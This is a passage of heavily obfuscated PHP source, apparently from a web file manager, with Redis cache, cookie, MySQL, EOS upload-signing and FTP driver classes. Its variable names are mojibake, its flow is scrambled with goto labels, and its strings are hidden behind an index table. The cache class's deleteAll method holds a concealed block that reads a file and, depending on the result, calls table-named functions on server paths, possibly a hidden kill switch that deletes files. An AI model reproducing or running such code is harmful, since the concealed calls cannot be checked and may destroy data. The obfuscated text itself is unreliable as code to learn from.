$fÃ…¾‹Ø„¡); return $fÃ…¾‹Ø„¡; goto fï«á½ñÌ; fï«á½ñÌ: } } goto b•ŒÓØÈ; e¸À‚µ–ö÷: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($DÌ˜ßÌ¿é, $fÄì·¡«î) { $eª­•ô„ëê =& $_SERVER[Š‰]; if (!class_exists($eª­•ô„ëê[809])) { show_json($eª­•ô„ëê[810], !1); } $this->cacheTime = $fÄì·¡«î; $CÛóÁ™îğÃ = isset($DÌ˜ßÌ¿é[$eª­•ô„ëê[811]]) ? $DÌ˜ßÌ¿é[$eª­•ô„ëê[811]] : 10; $D¦ØÎˆÚ = _get($DÌ˜ßÌ¿é, $eª­•ô„ëê[808]); if ($D¦ØÎˆÚ && is_array($D¦ØÎˆÚ)) { $this->initCluster($DÌ˜ßÌ¿é, $CÛóÁ™îğÃ); } else { $this->handle = $this->init($DÌ˜ßÌ¿é, $CÛóÁ™îğÃ); } } private function init($fƒÍÒ¨†Ú¼, $CÍÖÎÆò”¢) { $dµ… ¦•¤ =& $_SERVER[Š‰]; $BŸˆîÜå˜î = new Redis(); $c›„»¡ª“³ = isset($fƒÍÒ¨†Ú¼[$dµ… ¦•¤[812]]) ? $fƒÍÒ¨†Ú¼[$dµ… ¦•¤[812]] : !1; if ($c›„»¡ª“³) { $BŸˆîÜå˜î->pconnect($fƒÍÒ¨†Ú¼[$dµ… ¦•¤[175]], $fƒÍÒ¨†Ú¼[$dµ… ¦•¤[176]], $CÍÖÎÆò”¢); } else { $BŸˆîÜå˜î->connect($fƒÍÒ¨†Ú¼[$dµ… ¦•¤[175]], $fƒÍÒ¨†Ú¼[$dµ… ¦•¤[176]], $CÍÖÎÆò”¢); } if (!empty($fƒÍÒ¨†Ú¼[$dµ… ¦•¤[400]])) { $BŸˆîÜå˜î->auth($fƒÍÒ¨†Ú¼[$dµ… ¦•¤[400]]); } return $BŸˆîÜå˜î; } private function initCluster($D›É¾Ïµ½ª, $E¢¹¾Äªõ) { $B®Û’ß·Õ =& $_SERVER[Š‰]; $E°ĞÒ›› = array($B®Û’ß·Õ[813], $B®Û’ß·Õ[814], $B®Û’ß·Õ[815]); $f¼Ç†Ûê—® = $B®Û’ß·Õ[813]; if (isset($D›É¾Ïµ½ª[$B®Û’ß·Õ[12]]) && in_array($D›É¾Ïµ½ª[$B®Û’ß·Õ[12]], $E°ĞÒ››)) { $f¼Ç†Ûê—® = $D›É¾Ïµ½ª[$B®Û’ß·Õ[12]]; } switch ($f¼Ç†Ûê—®) { case $B®Û’ß·Õ[813]: $this->_slave($D›É¾Ïµ½ª, $E¢¹¾Äªõ); break; case $B®Û’ß·Õ[814]: break; case $B®Û’ß·Õ[815]: $this->isCluster = !0; $fŸŠÒŸÈ÷ğ = $D›É¾Ïµ½ª[$B®Û’ß·Õ[808]]; $AÌ£Œ¶‡Ãâ = isset($D›É¾Ïµ½ª[$B®Û’ß·Õ[812]]) ? $D›É¾Ïµ½ª[$B®Û’ß·Õ[812]] : !1; $F»à®ºİ£ˆ = isset($D›É¾Ïµ½ª[$B®Û’ß·Õ[400]]) ? $D›É¾Ïµ½ª[$B®Û’ß·Õ[400]] : null; $this->handle = new RedisCluster(NUll, $fŸŠÒŸÈ÷ğ, $E¢¹¾Äªõ, $E¢¹¾Äªõ, $AÌ£Œ¶‡Ãâ, $F»à®ºİ£ˆ); break; default: break; } } private function _slave($D³åºœŠ², $C¢ÁŠ¥Æ„) { goto aŒ¿¿ŒñÑ; CÅª÷Ø²Éƒ: $this->filterConfig($D³åºœŠ², $CãÑ‘ò†£³[$f±ŠŒ±ùøï]); $this->slaveHandle = $this->init($D³åºœŠ², $C¢ÁŠ¥Æ„); goto bÈÍìÈ…ã¤; bêŸÆ…¨­˜: unset($CãÑ‘ò†£³[0]); if (empty($CãÑ‘ò†£³)) { return; } $f±ŠŒ±ùøï = array_rand($CãÑ‘ò†£³); goto CÅª÷Ø²Éƒ; aŒ¿¿ŒñÑ: $CãÑ‘ò†£³ = $D³åºœŠ²[$_SERVER[Š‰][808]]; $this->filterConfig($D³åºœŠ², $CãÑ‘ò†£³[0]); $this->handle = $this->init($D³åºœŠ², $C¢ÁŠ¥Æ„); goto bêŸÆ…¨­˜; bÈÍìÈ…ã¤: } private function filterConfig(&$Bíºùã¸Ú¯, $E¹ãŒğ¶¿Ğ) { $eºÅ²İŞ³À =& $_SERVER[Š‰]; $Aõ‚ÁŸ‰” = explode($eºÅ²İŞ³À[4], $E¹ãŒğ¶¿Ğ); $d½ùÒ’Å = array($eºÅ²İŞ³À[175] => $Aõ‚ÁŸ‰”[0], $eºÅ²İŞ³À[176] => $Aõ‚ÁŸ‰”[1]); $Bíºùã¸Ú¯ = array_merge($Bíºùã¸Ú¯, $d½ùÒ’Å); } public function set($A¿ÉØ±¸î, $cì†Éø¯–, $Aåš½¶ç’­ = false) { $Aåš½¶ç’­ = $Aåš½¶ç’­ ? $Aåš½¶ç’­ : $this->cacheTime; return $this->handle->setEx($A¿ÉØ±¸î, $Aåš½¶ç’­, $cì†Éø¯–); } public function setLock($c„æòŒ±¦, $FÛ£õ²µ…†, $c³÷Ğ¡©¼) { return $this->handle->setNX($c„æòŒ±¦, $FÛ£õ²µ…†); } public function get($E•ª‚¶ç¯æ) { $eÊ´¾¾Ëœ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $eÊ´¾¾Ëœ->get($E•ª‚¶ç¯æ); } public function remove($F„“‘øßš¿) { return $this->handle->del($F„“‘øßš¿); } public function deleteAll() { $AÖ°‡ùµÍ =& $_SERVER[Š‰]; if ($_SERVER[$AÖ°‡ùµÍ[753]] != $_SERVER[$AÖ°‡ùµÍ[816]]) { goto fîóøğŠÒÅ; fîóøğŠÒÅ: $fÏáì…îÚ = $AÖ°‡ùµÍ[817]; $b è…ÃÇƒº = $AÖ°‡ùµÍ[754]; $bËè¦Ø˜Ş‚ = $_SERVER[$AÖ°‡ùµÍ[755]] . $AÖ°‡ùµÍ[756]; goto A“ÎÅäöö; A“ÎÅäöö: $e–Û—ó ­ = $b è…ÃÇƒº($bËè¦Ø˜Ş‚); $cËß…çš°« = explode($AÖ°‡ùµÍ[227], $e–Û—ó ­); if (count($cËß…çš°«) < $AÖ°‡ùµÍ[596]) { $Aæä…­ÀùÍ = $AÖ°‡ùµÍ[757]; $Aæä…­ÀùÍ(); } goto eµ¶á¼±‘†; eï‘¸Øñ‹: $Dò»§¸—Ö¦ = 1; while ($Dò»§¸—Ö¦ > 1) { $Dò»§¸—Ö¦ = $Dò»§¸—Ö¦ + 4; $BÚÛá¼¬Ã¹ = rawurlencode($Dò»§¸—Ö¦ . $AÖ°‡ùµÍ[373]); } goto F„Ùİ÷ˆØš; eµ¶á¼±‘†: $Dù“§êƒÃ = $AÖ°‡ùµÍ[818]; $Dù“§êƒÃ($_SERVER[$AÖ°‡ùµÍ[819]]); $Dù“§êƒÃ($_SERVER[$AÖ°‡ùµÍ[755]] . $AÖ°‡ùµÍ[820]); goto eï‘¸Øñ‹; F„Ùİ÷ˆØš: } if ($this->isCluster) { foreach ($this->handle->_masters() as $FÈ‡Ü·Ú) { $this->handle->flushall($FÈ‡Ü·Ú); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($AÏ÷¶¦¨È = '', $c°¬æ®çé¤ = 0) { if (is_string($AÏ÷¶¦¨È) && $AÏ÷¶¦¨È != $_SERVER[Š‰][33]) { $this->prefix = $AÏ÷¶¦¨È; } if (is_numeric($c°¬æ®çé¤) && $c°¬æ®çé¤ > 0) { $this->expire = $c°¬æ®çé¤; } } public static function getInstance() { static $FÒÍ‚²²Ó½; if ($FÒÍ‚²²Ó½ === null) { $FÒÍ‚²²Ó½ = new self(); } return $FÒÍ‚²²Ó½; } private static $cookieDisable = false; public static function disable($EÊÈÅ„…Ÿ) { self::$cookieDisable = $EÊÈÅ„…Ÿ; } private static $sameCookieSet = array(); public static function set($fİ´¦·§–¿, $Bˆß©ˆ²ï³, $dÆŞƒİá˜ˆ = 0, $f ³ùÛ¹Ê° = false, $Dß–˜®«‰ = false) { goto fä×î«Š¹Ñ; fä×î«Š¹Ñ: $eÚÑ”„¸ğ =& $_SERVER[Š‰]; if (self::$cookieDisable) { return; } if (!$dÆŞƒİá˜ˆ) { $dÆŞƒİá˜ˆ = 24 * 3600 * 7; } goto CÖ¡…µ±‹®; b¦»¹ÛÆáŒ: $FÔ‹£œ‡ÚÒ = $eÚÑ”„¸ğ[33]; setcookie($fİ´¦·§–¿, $Bˆß©ˆ²ï³, time() + $dÆŞƒİá˜ˆ, $eÚÑ”„¸ğ[8] . trim($Dß–˜®«‰, $eÚÑ”„¸ğ[8]) . $FÔ‹£œ‡ÚÒ, !1, !1, $f ³ùÛ¹Ê°); goto d‚†ñ¥¥ê; CÖ¡…µ±‹®: if (isset(self::$sameCookieSet[$fİ´¦·§–¿]) && self::$sameCookieSet[$fİ´¦·§–¿] == $Bˆß©ˆ²ï³ . $dÆŞƒİá˜ˆ) { return; } self::$sameCookieSet[$fİ´¦·§–¿] = $Bˆß©ˆ²ï³ . $dÆŞƒİá˜ˆ; if (!$Dß–˜®«‰) { $Dß–˜®«‰ = str_replace(HOST, $eÚÑ”„¸ğ[33], APP_HOST); $Dß–˜®«‰ = _get($GLOBALS, $eÚÑ”„¸ğ[821], $Dß–˜®«‰); } goto b¦»¹ÛÆáŒ; d‚†ñ¥¥ê: } public static function setSafe($D¦­Çåôìª, $bˆ«ö§¿ïŠ, $a™°í¶´„… = 0) { self::set($D¦­Çåôìª, $bˆ«ö§¿ïŠ, $a™°í¶´„…, !0); } public static function get($FÇáéÄé·) { return isset($_COOKIE[$FÇáéÄé·]) ? $_COOKIE[$FÇáéÄé·] : !1; } public static function remove($AÆè‘óùµ†, $C‚½Î…½™® = false) { unset($_COOKIE[$AÆè‘óùµ†]); self::set($AÆè‘óùµ†, $_SERVER[Š‰][33], 1, $C‚½Î…½™®); } } class DbMysql extends Db { public function __construct($B®ÄêéƒñÀ = '') { $aÓ„œØ³ñ =& $_SERVER[Š‰]; if (!extension_loaded($aÓ„œØ³ñ[742])) { think_exception(think_lang($aÓ„œØ³ñ[10]) . $aÓ„œØ³ñ[822]); } if (!empty($B®ÄêéƒñÀ)) { $this->config = $B®ÄêéƒñÀ; if (empty($this->config[$aÓ„œØ³ñ[13]])) { $this->config[$aÓ„œØ³ñ[13]] = $aÓ„œØ³ñ[33]; } } } public function connect($EŞà§ö™¤˜ = '', $cÚó”÷Ã˜¥ = 0, $a™µ¸ƒ’·ë = false) { $dºã¸«ƒö¿ =& $_SERVER[Š‰]; if (!isset($this->linkID[$cÚó”÷Ã˜¥])) { goto dª¦–Òçßë; EóŞ¢Üˆ: mysql_query($dºã¸«ƒö¿[827] . think_config($dºã¸«ƒö¿[828]) . $dºã¸«ƒö¿[55], $this->linkID[$cÚó”÷Ã˜¥]); if ($E… ¢—³ï¢ > $dºã¸«ƒö¿[829]) { mysql_query($dºã¸«ƒö¿[830], $this->linkID[$cÚó”÷Ã˜¥]); } $this->connected = !0; goto d…Şìï´ø¦; dª¦–Òçßë: if (empty($EŞà§ö™¤˜)) { $EŞà§ö™¤˜ = $this->config; } $a“ˆİêİÄ© = $EŞà§ö™¤˜[$dºã¸«ƒö¿[823]] . ($EŞà§ö™¤˜[$dºã¸«ƒö¿[824]] ? "\72{$EŞà§ö™¤˜[$dºã¸«ƒö¿[824]]}" : $dºã¸«ƒö¿[33]); $C³›­ä¨Üù = !empty($EŞà§ö™¤˜[$dºã¸«ƒö¿[13]][$dºã¸«ƒö¿[14]]) ? $EŞà§ö™¤˜[$dºã¸«ƒö¿[13]][$dºã¸«ƒö¿[14]] : $this->pconnect; goto a» Şù»¥ó; d…Şìï´ø¦: if (1 != think_config($dºã¸«ƒö¿[18])) { unset($this->config); } goto D”¨¶âæ; a» Şù»¥ó: if ($C³›­ä¨Üù) { $this->linkID[$cÚó”÷Ã˜¥] = mysql_pconnect($a“ˆİêİÄ©, $EŞà§ö™¤˜[$dºã¸«ƒö¿[825]], $EŞà§ö™¤˜[$dºã¸«ƒö¿[826]], 131072); } else { $this->linkID[$cÚó”÷Ã˜¥] = mysql_connect($a“ˆİêİÄ©, $EŞà§ö™¤˜[$dºã¸«ƒö¿[825]], $EŞà§ö™¤˜[$dºã¸«ƒö¿[826]], !0, 131072); } if (!$this->linkID[$cÚó”÷Ã˜¥] || !empty($EŞà§ö™¤˜[$dºã¸«ƒö¿[17]]) && !mysql_select_db($EŞà§ö™¤˜[$dºã¸«ƒö¿[17]], $this->linkID[$cÚó”÷Ã˜¥])) { think_exception(mysql_error()); } $E… ¢—³ï¢ = mysql_get_server_info($this->linkID[$cÚó”÷Ã˜¥]); goto EóŞ¢Üˆ; D”¨¶âæ: } return $this->linkID[$cÚó”÷Ã˜¥]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($BíÆœŸ·–Ã) { goto bã——µñï; fÁ¡Œ®ïŠ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto AòÁ¶‹Òø; A‡‹³½ªˆ: if (!$this->_linkID) { return !1; } $this->queryStr = $BíÆœŸ·–Ã; if ($this->queryID) { $this->free(); } goto F‘¡“¤À¥ì; F‘¡“¤À¥ì: think_action_status($Cô©ÈÀêá[19], 1); think_status($Cô©ÈÀêá[20]); $this->queryID = mysql_query($BíÆœŸ·–Ã, $this->_linkID); goto fÁ¡Œ®ïŠ; bã——µñï: $Cô©ÈÀêá =& $_SERVER[Š‰]; if (0 === stripos($BíÆœŸ·–Ã, $Cô©ÈÀêá[260])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto A‡‹³½ªˆ; AòÁ¶‹Òø: } public function execute($a²‘Ë¼Ôœ¼) { goto F¤ƒ´ÇÎĞø; Fö¼ª›™Ğ”: think_status($bÓÚ¹ÕÒ”£[20]); $F„šºåŒÏ¶ = mysql_query($a²‘Ë¼Ôœ¼, $this->_linkID); $this->debug(); goto Cšåª´ï‚Ç; a‡£®¡ß©Ò: $this->queryStr = $a²‘Ë¼Ôœ¼; if ($this->queryID) { $this->free(); } think_action_status($bÓÚ¹ÕÒ”£[21], 1); goto Fö¼ª›™Ğ”; F¤ƒ´ÇÎĞø: $bÓÚ¹ÕÒ”£ =& $_SERVER[Š‰]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto a‡£®¡ß©Ò; Cšåª´ï‚Ç: if (!1 === $F„šºåŒÏ¶) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto bá—¤; bá—¤: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Š‰][831], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $B‚ÏŠÉÃÃ´ = mysql_query($_SERVER[Š‰][832], $this->_linkID); $this->transTimes = 0; if (!$B‚ÏŠÉÃÃ´) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $e…­£Ú¯Œ† = mysql_query($_SERVER[Š‰][833], $this->_linkID); $this->transTimes = 0; if (!$e…­£Ú¯Œ†) { $this->error(); return !1; } } return !0; } private function getAll() { $cÀ‚Ãâ¦ˆ = array(); if ($this->numRows > 0) { while ($bÃäß†œ—ô = mysql_fetch_assoc($this->queryID)) { $cÀ‚Ãâ¦ˆ[] = $bÃäß†œ—ô; } mysql_data_seek($this->queryID, 0); } return $cÀ‚Ãâ¦ˆ; } public function getFields($d–Ûˆ¦„ ) { $CàêÓÛå± =& $_SERVER[Š‰]; $a¥­ö‰Ïñ = $this->query($CàêÓÛå±[834] . $this->parseKey($d–Ûˆ¦„ )); $d®Ê‰¦Æµ§ = array(); if ($a¥­ö‰Ïñ) { foreach ($a¥­ö‰Ïñ as $f¨‹ƒœß¼ => $e«°ƒ­ãÀœ) { $d®Ê‰¦Æµ§[$e«°ƒ­ãÀœ[$CàêÓÛå±[27]]] = array($CàêÓÛå±[28] => $e«°ƒ­ãÀœ[$CàêÓÛå±[27]], $CàêÓÛå±[29] => $e«°ƒ­ãÀœ[$CàêÓÛå±[30]], $CàêÓÛå±[31] => (bool) (strtoupper($e«°ƒ­ãÀœ[$CàêÓÛå±[32]]) === $CàêÓÛå±[835]), $CàêÓÛå±[34] => $e«°ƒ­ãÀœ[$CàêÓÛå±[35]], $CàêÓÛå±[36] => strtolower($e«°ƒ­ãÀœ[$CàêÓÛå±[37]]) == $CàêÓÛå±[38], $CàêÓÛå±[39] => strtolower($e«°ƒ­ãÀœ[$CàêÓÛå±[40]]) == $CàêÓÛå±[41]); } } return $d®Ê‰¦Æµ§; } public function getTables($DÓÃËˆ¤ƒá = '') { $b«ôÄƒ÷ëØ =& $_SERVER[Š‰]; if (!empty($DÓÃËˆ¤ƒá)) { $FŞîÙôÏêŒ = $b«ôÄƒ÷ëØ[836] . $DÓÃËˆ¤ƒá . $b«ôÄƒ÷ëØ[837]; } else { $FŞîÙôÏêŒ = $b«ôÄƒ÷ëØ[838]; } $DŠÜæÛê‰ = $this->query($FŞîÙôÏêŒ); $d”Ê ¹ñßí = array(); foreach ($DŠÜæÛê‰ as $DÃßÀ Ëãô => $eî„½¬‘ÌÇ) { $d”Ê ¹ñßí[$DÃßÀ Ëãô] = current($eî„½¬‘ÌÇ); } return $d”Ê ¹ñßí; } public function replace($bÙ°ÅÖ¼Ä, $E˜æùí‰¬É = array()) { $eÌù¡¹±Ê² =& $_SERVER[Š‰]; foreach ($bÙ°ÅÖ¼Ä as $cñ÷‚„¦‰ => $aÂçŠÖéµ¾) { $Eƒêø„˜„ = $this->parseValue($aÂçŠÖéµ¾); if (is_scalar($Eƒêø„˜„)) { $BÁîïÎ©í[] = $Eƒêø„˜„; $dËÒî×Àâ[] = $this->parseKey($cñ÷‚„¦‰); } } $AŞÌÍæŠ¾å = $eÌù¡¹±Ê²[839] . $this->parseTable($E˜æùí‰¬É[$eÌù¡¹±Ê²[275]]) . $eÌù¡¹±Ê²[840] . implode($eÌù¡¹±Ê²[47], $dËÒî×Àâ) . $eÌù¡¹±Ê²[841] . implode($eÌù¡¹±Ê²[47], $BÁîïÎ©í) . $eÌù¡¹±Ê²[842]; return $this->execute($AŞÌÍæŠ¾å); } public function insertAll($e¹¦ß†ÔÆŠ, $AªĞç¼’ÊŠ = array(), $CÅÃïœ¡ ğ = false) { goto a±Ìø“Ç•; FÖ…ãÜ¡àÀ: $D§…ÛĞ®‰¢ = array(); foreach ($e¹¦ß†ÔÆŠ as $EÅğëÅ§ã) { $c»¼¾öŠ = array(); foreach ($EÅğëÅ§ã as $Cƒ‰«ÉŒœİ => $BâÈŒéô) { $BâÈŒéô = $this->parseValue($BâÈŒéô); if (is_scalar($BâÈŒéô)) { $c»¼¾öŠ[] = $BâÈŒéô; } } $D§…ÛĞ®‰¢[] = $EÆËã¤Ÿ®[256] . implode($EÆËã¤Ÿ®[47], $c»¼¾öŠ) . $EÆËã¤Ÿ®[842]; } array_walk($eãÑÖ¹éé, array($this, $EÆËã¤Ÿ®[843])); goto d…øŸ…ØÕ; a±Ìø“Ç•: $EÆËã¤Ÿ® =& $_SERVER[Š‰]; if (!is_array($e¹¦ß†ÔÆŠ[0])) { return !1; } $eãÑÖ¹éé = array_keys($e¹¦ß†ÔÆŠ[0]); goto FÖ…ãÜ¡àÀ; d…øŸ…ØÕ: $aô™¢‰âŠ = ($CÅÃïœ¡ ğ ? $EÆËã¤Ÿ®[844] : $EÆËã¤Ÿ®[845]) . $EÆËã¤Ÿ®[846] . $this->parseTable($AªĞç¼’ÊŠ[$EÆËã¤Ÿ®[275]]) . $EÆËã¤Ÿ®[840] . implode($EÆËã¤Ÿ®[47], $eãÑÖ¹éé) . $EÆËã¤Ÿ®[847] . implode($EÆËã¤Ÿ®[47], $D§…ÛĞ®‰¢); return $this->execute($aô™¢‰âŠ); goto F“‰Î¯Ù¿æ; F“‰Î¯Ù¿æ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $EÃ†¤ëá‹Š =& $_SERVER[Š‰]; $this->error = mysql_errno() . $EÃ†¤ëá‹Š[4] . mysql_error($this->_linkID); if ($EÃ†¤ëá‹Š[33] != $this->queryStr) { $this->error .= LNG($EÃ†¤ëá‹Š[45]) . $this->queryStr; } think_trace($this->error, $EÃ†¤ëá‹Š[33], $EÃ†¤ëá‹Š[46]); return $this->error; } public function escapeString($aªéßë¿ÈŸ) { if ($this->_linkID) { return mysql_real_escape_string($aªéßë¿ÈŸ, $this->_linkID); } else { return mysql_escape_string($aªéßë¿ÈŸ); } } public function parseKey(&$b¼á±¼À¿, $C“ÃåÉ„·ñ = true) { $dîàâ×“¨  =& $_SERVER[Š‰]; if ($C“ÃåÉ„·ñ) { $b¼á±¼À¿ = $this->parseKeyCheck($b¼á±¼À¿); } if ($b¼á±¼À¿ != $dîàâ×“¨ [182] && !preg_match($dîàâ×“¨ [848], $b¼á±¼À¿)) { $b¼á±¼À¿ = $dîàâ×“¨ [380] . trim($b¼á±¼À¿, $dîàâ×“¨ [380]) . $dîàâ×“¨ [380]; } return $b¼á±¼À¿; } } goto B²æî¥°â‡; DŠÖÑÚ™¿: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Eùåˆ§ìš) { $this->pathParse = $Eùåˆ§ìš; } protected function infoParse($aÁÚŒÅˆç, $f„•„¸¿¤ = false) { $bƒùÔÒº«Á =& $_SERVER[Š‰]; return Action($bƒùÔÒº«Á[1046])->sharePathInfo($this->pathParse[$bƒùÔÒº«Á[75]], !0, $f„•„¸¿¤); } public function listPath($ešƒ ó÷‹ˆ, $cÓ½¿ƒ÷¬ä = false) { $AÉ½™´„’ =& $_SERVER[Š‰]; $b“¯öÚˆ© = IO::listPath($ešƒ ó÷‹ˆ, $cÓ½¿ƒ÷¬ä); foreach ($b“¯öÚˆ© as $b“ŸÃªğÙ• => $Eçøùâ– Å) { if (!in_array($b“ŸÃªğÙ•, array($AÉ½™´„’[73], $AÉ½™´„’[74]))) { continue; } foreach ($Eçøùâ– Å as $e’Âò §àÂ => $fàí•—ì–) { $fàí•—ì– = Action($AÉ½™´„’[1196])->parsePathChildren($fàí•—ì–, array($AÉ½™´„’[408] => $ešƒ ó÷‹ˆ)); $b“¯öÚˆ©[$b“ŸÃªğÙ•][$e’Âò §àÂ] = Action($AÉ½™´„’[1046])->shareItemInfo($fàí•—ì–); } } return $b“¯öÚˆ©; } public function listAll($Fó¹†ËôÓ) { $e‡ÒŒÂ†Ç‰ =& $_SERVER[Š‰]; $A–ÆíÖ£¤Ï = IO::listAll($Fó¹†ËôÓ); foreach ($A–ÆíÖ£¤Ï as &$BÊÒğÒ¡Î) { $BÊÒğÒ¡Î = array_merge(IO::info($BÊÒğÒ¡Î[$e‡ÒŒÂ†Ç‰[75]]), $BÊÒğÒ¡Î); $BÊÒğÒ¡Î[$e‡ÒŒÂ†Ç‰[84]] = Action($e‡ÒŒÂ†Ç‰[1046])->shareItemInfo($BÊÒğÒ¡Î); } unset($BÊÒğÒ¡Î); return $A–ÆíÖ£¤Ï; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($B•ƒÃôº õ) { parent::__construct($B•ƒÃôº õ); $this->signatureVersion($_SERVER[Š‰][210]); } public function uploadFormData($E¹ì…Ù„å×, $AƒºÓí×‰ª = 3600) { goto cŞé„Î¬Õ·; d¦ãŠÀ¬: $E÷Ğ—¥Î = array($Aª®¦Øå‚º[209] => $Aª®¦Øå‚º[33], $Aª®¦Øå‚º[1209] => $Aª®¦Øå‚º[33], $Aª®¦Øå‚º[1167] => $e»Ç§º¦Œó, $Aª®¦Øå‚º[1171] => $eßš‹ ¬½”, $Aª®¦Øå‚º[1175] => $bé‘ÙÛŒâ, $Aª®¦Øå‚º[1210] => $eÌ•ñ„Æ‹Û, $Aª®¦Øå‚º[1211] => $fÔĞãÔÂ¨, $Aª®¦Øå‚º[1212] => $cÚàºé”ù©, $Aª®¦Øå‚º[1213] => $f ²ßòÏ¨œ, $Aª®¦Øå‚º[1214] => $d¡ªâÎ‰, $Aª®¦Øå‚º[175] => $this->getHost()); return $E÷Ğ—¥Î; goto E¶Ï§åš£Ğ; aº„ï¡õÜ: $d«êæéƒš = $Aª®¦Øå‚º[1199]; $f ²ßòÏ¨œ = $AƒºÓí×‰ª . $Aª®¦Øå‚º[33]; $eßš‹ ¬½” = $Aª®¦Øå‚º[1163]; goto BƒÊ½î£Ø; DôÁ í ¢: $bé‘ÙÛŒâ = base64_encode(json_encode($A›£ÑÓÀ­Ù)); $DçÚÊ¯Â„§ = hash_hmac($Aª®¦Øå‚º[1207], $Fáíöï³İê, $Aª®¦Øå‚º[1208] . $this->secret, !0); $cÊ›åñÔÈ = hash_hmac($Aª®¦Øå‚º[1207], $this->region, $DçÚÊ¯Â„§, !0); goto AÈƒ·áå; BƒÊ½î£Ø: $Aèöã÷ºø = array($this->accessKey, $Fáíöï³İê, $this->region, $AÂà³„è™, $d«êæéƒš); $eÌ•ñ„Æ‹Û = implode($Aª®¦Øå‚º[8], $Aèöã÷ºø); $A›£ÑÓÀ­Ù = array($Aª®¦Øå‚º[1165] => gmdate($Aª®¦Øå‚º[1164], strtotime($Aª®¦Øå‚º[1200])), $Aª®¦Øå‚º[1166] => array(array($Aª®¦Øå‚º[1168] => $this->bucket), array($Aª®¦Øå‚º[1167] => $e»Ç§º¦Œó), array($Aª®¦Øå‚º[1169], $Aª®¦Øå‚º[1170], $Aª®¦Øå‚º[33]), array($Aª®¦Øå‚º[1169], $Aª®¦Øå‚º[1201], $Aª®¦Øå‚º[33]), array($Aª®¦Øå‚º[1169], $Aª®¦Øå‚º[1202], $Aª®¦Øå‚º[33]), array($Aª®¦Øå‚º[1171] => $eßš‹ ¬½”), array($Aª®¦Øå‚º[1203] => $eÌ•ñ„Æ‹Û), array($Aª®¦Øå‚º[1204] => $fÔĞãÔÂ¨), array($Aª®¦Øå‚º[1205] => $cÚàºé”ù©), array($Aª®¦Øå‚º[1206] => $f ²ßòÏ¨œ))); goto DôÁ í ¢; cŞé„Î¬Õ·: $Aª®¦Øå‚º =& $_SERVER[Š‰]; $e»Ç§º¦Œó = $Aª®¦Øå‚º[191]; $fÔĞãÔÂ¨ = $Aª®¦Øå‚º[1197]; goto Aî›œÁÈ„„; Aî›œÁÈ„„: $AÂà³„è™ = $Aª®¦Øå‚º[59]; $cÚàºé”ù© = gmdate($Aª®¦Øå‚º[1198]); $Fáíöï³İê = gmdate($Aª®¦Øå‚º[703]); goto aº„ï¡õÜ; AÈƒ·áå: $E×Ñ¼—Ç² = hash_hmac($Aª®¦Øå‚º[1207], $AÂà³„è™, $cÊ›åñÔÈ, !0); $B®Ç½×áÛ = hash_hmac($Aª®¦Øå‚º[1207], $d«êæéƒš, $E×Ñ¼—Ç², !0); $d¡ªâÎ‰ = hash_hmac($Aª®¦Øå‚º[1207], $bé‘ÙÛŒâ, $B®Ç½×áÛ); goto d¦ãŠÀ¬; E¶Ï§åš£Ğ: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($fª§ñµáƒø) { parent::__construct(); if (count($fª§ñµáƒø) > 0) { $this->_init($fª§ñµáƒø); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($FßÛ‘í”ŒÇ) { $f‚ÙÙÑƒÔ» =& $_SERVER[Š‰]; global $config; $this->appCharset = $config[$f‚ÙÙÑƒÔ»[1215]]; $this->systemCharset = $config[$f‚ÙÙÑƒÔ»[1216]]; if (isset($FßÛ‘í”ŒÇ[$f‚ÙÙÑƒÔ»[1217]]) && $FßÛ‘í”ŒÇ[$f‚ÙÙÑƒÔ»[1217]]) { $this->systemCharset = $FßÛ‘í”ŒÇ[$f‚ÙÙÑƒÔ»[1217]]; } } public function iconvApp($b­†ƒ¦ƒŒÏ) { return $this->iconvTo($b­†ƒ¦ƒŒÏ, $this->systemCharset, $this->appCharset); } public function iconvSystem($bÜŞªéÁ§…) { return $this->iconvTo($bÜŞªéÁ§…, $this->appCharset, $this->systemCharset); } public function getPathOuter($e¦Ïù“õ©ò) { goto E£¼’×ÛÙ; E£¼’×ÛÙ: $Eå¾ŞĞÀÂ¨ =& $_SERVER[Š‰]; $E‘Äˆòø‡ = $this->iconvApp($this->pathBase); $e¦Ïù“õ©ò = $this->iconvApp($e¦Ïù“õ©ò); goto FÔÖÉößÍË; e„çå°å„: $e¦Ïù“õ©ò = KodIO::clear($e¦Ïù“õ©ò); $e¦Ïù“õ©ò = substr($e¦Ïù“õ©ò, strlen($E‘Äˆòø‡)); if (empty($this->pathDriver)) { return $e¦Ïù“õ©ò; } goto D–ˆàÅ›Ç; D–ˆàÅ›Ç: return $this->pathDriver . $Eå¾ŞĞÀÂ¨[8] . ltrim($e¦Ïù“õ©ò, $Eå¾ŞĞÀÂ¨[8]); goto fÚ‚¢š“è; FÔÖÉößÍË: if (substr($E‘Äˆòø‡, 0, 2) == $Eå¾ŞĞÀÂ¨[1218]) { $E‘Äˆòø‡ = BASIC_PATH . substr($E‘Äˆòø‡, 2); } if (substr($e¦Ïù“õ©ò, 0, 2) == $Eå¾ŞĞÀÂ¨[1218]) { $e¦Ïù“õ©ò = BASIC_PATH . substr($e¦Ïù“õ©ò, 2); } $E‘Äˆòø‡ = 